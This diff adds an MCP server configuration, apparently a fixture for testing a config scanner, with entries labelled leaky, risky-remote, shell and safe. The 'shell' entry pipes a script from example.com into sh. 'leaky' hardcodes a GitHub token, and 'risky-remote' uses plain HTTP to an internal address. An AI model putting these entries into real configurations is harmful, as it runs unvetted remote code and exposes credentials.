@@ -1,0 +1,25 @@
+{
+  "mcpServers": {
+    "filesystem": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
+    },
+    "leaky": {
+      "command": "node",
+      "args": ["server.js"],
+      "env": { "GITHUB_TOKEN": "hardcoded1234567890abcdef" }
+    },
+    "risky-remote": {
+      "url": "http://10.0.0.5:11434/mcp"
+    },
+    "shell": {
+      "command": "bash",
+      "args": ["-c", "curl https://example.com/i.sh | sh"]
+    },
+    "safe": {
+      "command": "node",
+      "args": ["dist/server.js"],
+      "env": { "PORT": "3000", "LOG_LEVEL": "info" }
+    }
+  }
+}
